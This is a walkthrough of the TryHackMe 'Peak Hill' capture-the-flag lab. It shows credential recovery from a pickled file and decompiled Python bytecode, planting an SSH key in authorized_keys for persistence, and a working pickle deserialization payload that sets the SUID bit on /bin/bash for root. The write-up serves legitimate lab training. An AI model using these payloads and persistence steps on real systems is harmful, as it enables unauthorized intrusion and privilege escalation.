---
published: true
title: Peak Hill - TryHackMe Walkthrough
category: Writeup
image: 'https://imgur.com/tLd4R7m.png'
author: F3dai
---
"Deploy and compromise the machine! Exercises in Python library abuse and some exploitation techniques." This is a TryHackMe box. To access this you must sign up to [https://tryhackme.com/](https://tryhackme.com/).

**URL:** [Peak Hill](https://www.tryhackme.com/room/peakhill)

**Difficulty:** Medium

**Author:** John Hammond

## Enumeration

We are given the IP 10.10.37.186. Run an nmap scan with the following command:

<pre>nmap -A -p- -sS -o portscan 10.10.245.166</pre>

Here are the open ports:

<pre>PORT     STATE  SERVICE  VERSION
20/tcp   closed ftp-data
21/tcp   open   ftp      vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 ftp      ftp            17 May 15 18:37 test.txt
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.9.6.63
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   open   ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 04:d5:75:9d:c1:40:51:37:73:4c:42:30:38:b8:d6:df (RSA)
|   256 7f:95:1a:d7:59:2f:19:06:ea:c1:55:ec:58:35:0c:05 (ECDSA)
|_  256 a5:15:36:92:1c:aa:59:9b:8a:d8:ea:13:c9:c0:ff:b6 (ED25519)
7321/tcp open   swx?
| fingerprint-strings:
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns:
|     Username: Password:
|   NULL:
|_    Username:</pre>

Let's first visit the open FTP port by logging in as Anonymous:

<pre>ftp 10.10.245.166
Anonymous
ls -la</pre>

![ftp](https://imgur.com/rGEq7Vz.png)

There are a couple of files which we should transfer over to analyse:

<pre>get .creds
get test.txt
bye</pre>

**test.txt**:

<pre>vsftpd test file</pre>

![test](https://imgur.com/wwEwkYn.png)

**.creds**:

![creds](https://imgur.com/cmujSKo.png)

The creds file has a lot of binary data which we need to convert. I used this script to convert it to ASCII:

<pre>import binascii

f = open(".creds","r").read()
f = int(f, 2)
print(binascii.unhexlify("%x" % f))</pre>

Execute this with python 2 and redirect to a file:

<pre>python convert.py > data</pre>

Great, have a look at the file you just created:

![data file](https://imgur.com/H6fKDjW.png)

<pre>�]q(X
ssh_pass15qXuq�qX       ssh_user1qXhq�qX
ssh_pass25qXr�q X
ssh_pass20q
h�q
   X    ssh_pass7q
�qX     ssh_user0qXgq�qX
ssh_pass26qXlq�qX       ssh_pass5qX3q�qX        ssh_pass1q▒X1q�q▒X
�qX_pass22q
ssh_pass12qX@q�qX       ssh_user2q Xeq!�q&quot;X     ssh_user5q#Xiq$�q%X
�q'Xpass18q&amp;h
ssh_pass27q(Xdq)�q*X    ssh_pass3q+Xkq,�q-X
ssh_pass19q.Xtq/�q0X    ssh_pass6q1Xsq2�q3X     ssh_pass9q4h�q5X
ssh_pass23q6Xwq7�q8X
ssh_pass21q9h�q:X       ssh_pass4q;h�q&lt;X
ssh_pass14q=X0q&gt;�q?X    ssh_user6q@XnqA�qBX     ssh_pass2qCXcqD�qEX
ssh_pass13qF�qGX
ssh_pass16qHhA�qIX      ssh_pass8qJh�qKX
ssh_pass17qLh)�qMX
ssh_pass24qNh&gt;�qOX      ssh_user3qP�qQX ssh_user4qRh,�qSX
�qUXpassssh_pass0qVXpqW�qXX
ssh_pass10qYh�qZe.</pre>

This file doesn't make much sense other than "ssh_user" and "ssh_pass". It probably contains some credentials we need to find but it's currently in an unreadable format.

I did some research, the challenge gives some hints towards a python library and there was also a picture of a pickle so I had to guess that we need to unpickle the file.

![pickle](https://imgur.com/EXfupRX.png)

Usually, if you receive a pickled file over a network, it's probably best to not unpickle it as it may contain malicious code. The pickle module in Python serialises objects so they can be saved to a file, and loaded in a program again later on.

[Python Pickle Documentation](https://docs.python.org/3/library/pickle.html)

Here is a script to unpickle the data:

<pre>import pickle

data = open("data", "rb")
res = pickle.load(data)

print(res)</pre>

And execute with python 3:

<pre>python3 unpickle.py</pre>

![res](https://imgur.com/6NUivhK.png)

We got the unpickled file. it looks like we have all the letters for a username and password but they are all jumbled up. I extended this script to just display the letters in the correct order:

<pre>import pickle
import re
import collections

data = open("data", "rb")
res = pickle.load(data)

array = str(res).split("), (")

password={}
username={}

for item in array:
        if "pass" in item:
                sanitise = re.search(", '(.*)'", item)
                letter = sanitise.group(1)
                sanitise = re.search("ssh_pass(.*)',", item)
                number = sanitise.group(1)
                password[int(number)] = letter
        else:
                sanitise = re.search(", '(.*)'", item)
                letter = sanitise.group(1)
                sanitise = re.search("ssh_user(.*)',", item)
                number = sanitise.group(1)
                username[int(number)] = letter

username = collections.OrderedDict(sorted(username.items()))
password = collections.OrderedDict(sorted(password.items()))

print("Username: ", end = '')
for a, b in username.items(): print(b, end = '')
print("\nPassword: ", end = '')
for a, b in password.items(): print(b, end = '')
print("\n")</pre>

![creds](https://imgur.com/lYTH9NI.png)

<pre>Username: gherkin
Password: p1************************ld</pre>

Let's use these credentials to connect via SSH

<pre>ssh gherkin@10.10.245.166</pre>

![ssh](https://imgur.com/hHpxf4G.png)

## Gherkin

We are logged in as "gherkin". There is a python bytecode file in the users home directory:

![cache](https://imgur.com/9fOpIxU.png)

It is possible to decompile this file to read the original .py python file.

[Github - uncompyle2](https://github.com/Mysterie/uncompyle2)

I transfered the file over to my local machine with ssh copy:

<pre>scp gherkin@10.10.251.122:/home/gherkin/cmd_service.pyc .</pre>

We will be using a tool called "uncompyle6". To install this python package run the following command:

<pre> pip3 install uncompyle6</pre>

Then run this command to decompile your file:

<pre>uncompyle6 -o . cmd_service.pyc</pre>

![decompile](https://imgur.com/7JEj3rG.png)

*Please note* my command "py" is an alias for python3 (image above).

This is the uncompiled code:

<pre># uncompyle6 version 3.7.0
# Python bytecode 3.8 (3413)
# Decompiled from: Python 3.8.2 (default, Apr  1 2020, 15:52:55)
# [GCC 9.3.0]
# Embedded file name: ./cmd_service.py
# Compiled at: 2020-05-14 13:55:16
# Size of source mod 2**32: 2140 bytes
from Crypto.Util.number import bytes_to_long, long_to_bytes
import sys, textwrap, socketserver, string, readline, threading
from time import *
import getpass, os, subprocess
username = long_to_bytes(1684630636)
password = long_to_bytes(24******************************************56)

class Service(socketserver.BaseRequestHandler):

    def ask_creds(self):
        username_input = self.receive(b'Username: ').strip()
        password_input = self.receive(b'Password: ').strip()
        print(username_input, password_input)
        if username_input == username:
            if password_input == password:
                return True
        return False

    def handle(self):
        loggedin = self.ask_creds()
        if not loggedin:
            self.send(b'Wrong credentials!')
            return None
        self.send(b'Successfully logged in!')
        while True:
            command = self.receive(b'Cmd: ')
            p = subprocess.Popen(command,
              shell=True, stdout=(subprocess.PIPE), stderr=(subprocess.PIPE))
            self.send(p.stdout.read())

    def send(self, string, newline=True):
        if newline:
            string = string + b'\n'
        self.request.sendall(string)

    def receive(self, prompt=b'> '):
        self.send(prompt, newline=False)
        return self.request.recv(4096).strip()


class ThreadedService(socketserver.ThreadingMixIn, socketserver.TCPServer, socketserver.DatagramRequestHandler):
    pass


def main():
    print('Starting server...')
    port = 7321
    host = '0.0.0.0'
    service = Service
    server = ThreadedService((host, port), service)
    server.allow_reuse_address = True
    server_thread = threading.Thread(target=(server.serve_forever))
    server_thread.daemon = True
    server_thread.start()
    print('Server started on ' + str(server.server_address) + '!')
    while True:
        sleep(10)


if __name__ == '__main__':
</pre>

We have two variables called username and password. Luckily for us, the credentials are hardcoded into this script. 

The python code seems to create a connection like a shell server. It looks like it creates a service on port 7321.

I refered to this website about the python function long_to_bytes():

[long_to_bytes](https://kite.com/python/docs/Crypto.Util.number.long_to_bytes)

I decoded the username and password in my python terminal:

<pre>python3
from Crypto.Util.number import long_to_bytes
print(long_to_bytes(1684630636))
print(long_to_bytes(24******************************************56))</pre>

![decode creds](https://imgur.com/UPQA6Mz.png)

I noticed a user called "dill" in the /home directory so let's try and connect to dill now that we have the credentials for the shell.

![dill](https://imgur.com/cNaAXh4.png)

## Dill

I execute the following netcat using the IP and port from the script we saw earlier:

<pre>nc 10.10.251.122 7321
dill
n*****************t</pre>

![netcat](https://imgur.com/8BqeH14.png)

I noticed this was a very limiting shell as it is just stuck in /var/cmd.

To upgrade our shell, add your ssh key to the authorized_keys file in .ssh.

Create a key on your local machine:

<pre>ssh-keygen
f3dai
(no password)</pre>

There should be 2 files: f3dai and f3dai.pub. You want to copy the contents of f3dai.pub and paste it into the machines ssh directory.

On our limited shell:

<pre>echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDmfQRd8TY4bd0k/euVw6M7zwQkfvN8rlS2X2fmY8FH9lLo4o7wmsPRqA19+CeqL5qz/QmSoXklXbKKr6PfVyeS+OuZLn7+d+OdDRumiEP95uZQFs9p/PToM6hXP15pNudtG0xFclQfGbVgfGZb6TSX3amSsetGCKxh9U+4IQV+WmjTxnvRKmY5gTfXU7bTwhMX8hu0hYBq+3dWvKhAE2MIsBEzGLGQLXQ0zrkErGinoweOVBh+DRhTeAVatOl3wb3z/OnE7QXAQvh/kYa2d2zyflar2Jnwb81yM2nSAwf9aXXM0PVfWMk7iBBvDSyj6g3bVnODkcqqYTn5ZCFwZZxaU5Z11IZuJk1vAgJRNPvy+qmVrA9vfgJfDSnLVyhwtM7B7NBkhMVBG49T6pIdnmtDvplVym+OAwIzbkYJAASXJvIvseCJ+SDC1AoDjYGmRA8v7jQD5HG/0cjln5fOPH8ceZOG3rkQSwi0W21cm0xzYx3ZHY5lQlUtfkxGaJgm298= root@F3dai" >> /home/dill/.ssh/authorized_keys</pre>

Now connect via SSH:

<pre>ssh dill@10.10.251.122 -i f3dai</pre>

The -i f3dai refers to the file we created earlier with ssh-keygen.

![ssh dill](https://imgur.com/nduSrnZ.png)

## Privilege Escalation

Let's find out what we can exploit to get root access.

Let's see what sudo rights the current user has:

<pre>sudo -l</pre>

![sudo l](https://imgur.com/AKO4Spv.png)

<pre>dill@ubuntu-xenial:~$ sudo -l
Matching Defaults entries for dill on ubuntu-xenial:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dill may run the following commands on ubuntu-xenial:
    (ALL : ALL) NOPASSWD: /opt/peak_hill_farm/peak_hill_farm</pre>
   
This means we have sudo privileges in /opt/peak_hill_farm/peak_hill_farm.

![peak hill farm](https://imgur.com/d7St1GN.png)

This is an executable file, however, I can't see the contents:

![file](https://imgur.com/vBsxZrl.png)

Let's run this executable:

<pre>sudo ./peak_hill_farm</pre>

I entered "testing" for the input:

![exe](https://imgur.com/3bqQZVw.png)

<pre>to grow: testing
failed to decode base64</pre>

Seems like it's waiting for base64 input. "testing" encoded as base64 is dGVzdGluZw==. Let's try to use this as input:

![base64 input](https://imgur.com/BFVWRVA.png)

<pre>to grow: dGVzdGluZw==
this not grow did not grow on the Peak Hill Farm! :(</pre>

Serialisation and de-serialisation libraries like **pickle** allow the execution of arbitrary commands. Let's pickle some data to hopefully get us root.

Take this script:

<pre>import pickle
import base64

class execute(object):
    def __reduce__(self):
        import os
        return (os.system,("chmod u+s /bin/bash",))
   
print(base64.b64encode(pickle.dumps(execute())))</pre>

"chmod u+s /bin/bash" essentially sets the "Set-User-ID" bit to make anyone the owner of /bin/bash, then  base64.b64encode() returns the base64 value of this whole function. Thanks to [paradoxical](http://paradoxical.tech/) for the script.

Let's run this python script and enter the base64 value into the script on peak hill.

<pre>python3 pickleme.py</pre>

We get the following result:

<pre>b'gASVLgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjBNjaG1vZCB1K3MgL2Jpbi9iYXNolIWUUpQu'</pre>

Let's put that into the executable:

![run exe again](https://imgur.com/mUCJgFm.png)

We have a root shell. Let's find the final flag in /root:

<pre>cd /root
cat root.txt</pre>

This gave an error, likely due to the name of the file. I tried to display all file contents with:

<pre>cat *</pre>

I heard this was enough for some people but it didn't work for me so I had to add my ssh key in /root/.ssh/authorized-keys, and connect through ssh to view the file.

<pre>echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDmfQRd8TY4bd0k/euVw6M7zwQkfvN8rlS2X2fmY8FH9lLo4o7wmsPRqA19+CeqL5qz/QmSoXklXbKKr6PfVyeS+OuZLn7+d+OdDRumiEP95uZQFs9p/PToM6hXP15pNudtG0xFclQfGbVgfGZb6TSX3amSsetGCKxh9U+4IQV+WmjTxnvRKmY5gTfXU7bTwhMX8hu0hYBq+3dWvKhAE2MIsBEzGLGQLXQ0zrkErGinoweOVBh+DRhTeAVatOl3wb3z/OnE7QXAQvh/kYa2d2zyflar2Jnwb81yM2nSAwf9aXXM0PVfWMk7iBBvDSyj6g3bVnODkcqqYTn5ZCFwZZxaU5Z11IZuJk1vAgJRNPvy+qmVrA9vfgJfDSnLVyhwtM7B7NBkhMVBG49T6pIdnmtDvplVym+OAwIzbkYJAASXJvIvseCJ+SDC1AoDjYGmRA8v7jQD5HG/0cjln5fOPH8ceZOG3rkQSwi0W21cm0xzYx3ZHY5lQlUtfkxGaJgm298= root@F3dai" >> /root/.ssh/authorized_keys</pre>

On my local machine:

<pre>ssh root@10.10.4.255 -i f3dai
cat *</pre>

![root](https://imgur.com/vy8tMFu.png)

We can submit the root flag.

I found this a great box. It was harder than some of the other "medium" boxes I've done on TryHackMe as it required some python knowledge.
